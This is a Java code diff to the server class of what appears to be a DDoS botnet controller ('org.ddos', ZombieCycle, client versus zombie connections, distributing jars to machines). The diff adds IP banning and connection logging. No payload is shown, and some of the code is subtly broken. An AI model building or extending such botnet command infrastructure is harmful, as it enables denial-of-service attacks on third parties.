@@ -6,11 +6,15 @@ import java.io.File;
 import java.io.FileReader;
 import java.io.IOException;
 import java.io.Serializable;
+import java.net.SocketAddress;
 import java.net.SocketException;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.regex.Pattern;
 
 import org.ddos.server.cycle.ClientCycle;
 import org.ddos.server.cycle.ZombieCycle;
+import org.ddos.util.Computer;
 import org.ddos.util.Status;
 import org.jnetwork.DataPackage;
 import org.jnetwork.Server;
@@ -38,6 +42,7 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 	private Server server;
 	private Status status = new Status();
+	private ArrayList<Computer> banList = new ArrayList<>();
 	public ArrayList<SocketPackage> readingClients = new ArrayList<>();
 
 	public Server getServer() {
@@ -51,6 +56,13 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 	@Override
 	public void clientConnected(SocketPackage event) {
 		try {
+			System.out.println(event.getConnection().getRemoteSocketAddress() + " connected.");
+			if (isBanned(event.getConnection().getRemoteSocketAddress())) {
+				System.out.println(
+						event.getConnection().getRemoteSocketAddress() + " Kicked for having a banned IP address.");
+				event.getConnection().close();
+				return;
+			}
 			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
 			if (initialPackage.getMessage().endsWith("REQUEST")) {
 				System.out.println(event.getConnection().getRemoteSocketAddress() + " A computer has request a jar: "
@@ -74,7 +86,7 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 			}
 
 			boolean isClient = !(boolean) initialPackage.getObjects()[0];
-			println(event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
+			println(event.getConnection().getRemoteSocketAddress() + " is a " + (isClient ? "client." : "zombie."));
 			if (isClient) {
 				boolean success = CLIENT_JAR_CODE.equals(initialPackage.getObjects()[1]);
 				event.getOutputStream().writeObject(new Boolean(success));
@@ -131,5 +143,33 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 	public void setStatus(Status status) {
 		this.status = status;
+	}
+
+	public Computer[] getBanlist() {
+		return (Computer[]) banList.toArray();
+	}
+
+	public void setBanlist(Computer... banList) {
+		this.banList = new ArrayList<>(Arrays.asList(banList));
+	}
+
+	public void ban(Computer computer) {
+		this.banList.add(computer);
+	}
+
+	public void unban(Computer computer) {
+		this.banList.remove(computer);
+	}
+
+	public boolean isBanned(Computer computer) {
+		return this.banList.contains(computer);
+	}
+
+	public boolean isBanned(SocketAddress addr) {
+		for (Computer comp : banList)
+			if (comp.getAddress().toString().split(Pattern.quote(":"))[0]
+					.equals(addr.toString().split(Pattern.quote(":"))[0]))
+				return true;
+		return false;
 	}
 }
